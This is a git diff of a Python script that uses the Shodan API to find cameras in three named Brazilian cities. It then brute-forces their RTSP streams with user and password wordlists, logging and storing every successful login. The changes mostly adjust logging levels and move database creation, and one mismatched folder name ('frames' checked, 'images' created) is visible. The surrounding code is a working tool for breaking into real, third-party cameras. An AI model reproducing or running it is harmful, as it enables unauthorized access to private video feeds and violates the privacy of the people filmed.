@@ -130,6 +130,7 @@ def check_rtsp_connection_by_host(host, port, user, password, rtsp_string):
     try:
         ret, frame = vcap.read()
         if not frame:
+            logging.debug(f'No frame for {rtsp_url}')
             return None
         logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}, user: {user}, password: {password}')
         update_from_db_values(host, port, user, password, rtsp_url, 1)
@@ -138,6 +139,7 @@ def check_rtsp_connection_by_host(host, port, user, password, rtsp_string):
         logging.error(f'Error: {e}')
         return None
     finally:
+        logging.debug(f'Releasing {rtsp_url}')
         vcap.release()
 
 
@@ -158,7 +160,7 @@ def is_camera(host, port, path):
 
 def thread_add_cameras_on_db(timeout):
     query = 'city:"Itatiba,Valinhos,Campinas" cam'
-    logging.info(f'Starting thread_add_cameras_on_db using query "{query}" with {timeout} seconds of timeout')
+    logging.debug(f'Starting thread_add_cameras_on_db using query "{query}" with {timeout} seconds of timeout')
     api = shodan.Shodan(os.getenv('SHODAN_KEY'))
     results = api.search_cursor(query)
 
@@ -192,9 +194,9 @@ def thread_test_cameras(executor_threads, timeout, users_wordlist, passwords_wor
         random.shuffle(camera_passwords)
         random.shuffle(rtsp_url_type)
 
-    logging.info(f'Using {executor_threads} threads in thread_test_cameras')
+    logging.debug(f'Using {executor_threads} threads in thread_test_cameras')
     cameras = get_random_from_db()
-    logging.info(f'Testing {len(cameras)} cameras')
+    logging.debug(f'Testing {len(cameras)} cameras')
     camera_combinations = itertools.product(rtsp_url_type, camera_users, camera_passwords, cameras)
     for url, user, password, camera in camera_combinations:
         ip, port = camera[1], camera[2]
@@ -230,6 +232,12 @@ def parse_arguments() -> argparse.Namespace:
         if not os.path.exists(args.rtsp_urls):
             parser.error(f'RTSP URLs file "{args.rtsp_urls}" not found')
             return False
+        if not os.path.exists(args.db_name):
+            logging.info(f'Database "{args.db_name}" not found, creating now')
+            create_db()
+        if not os.path.exists('frames'):
+            logging.info(f'Frames folder not found, creating now')
+            os.mkdir('images')
         return True
 
     if check_paths(parser.parse_args()):
@@ -241,11 +249,6 @@ def parse_arguments() -> argparse.Namespace:
 def main():
 
     args = parse_arguments()
-
-    db_name = args.db_name
-    if not os.path.exists(db_name):
-        create_db()
-        logging.info(f'Database {db_name} created on path {os.getcwd()}')
 
     arg_threads = args.threads
     arg_test_timeout = args.test_sleep
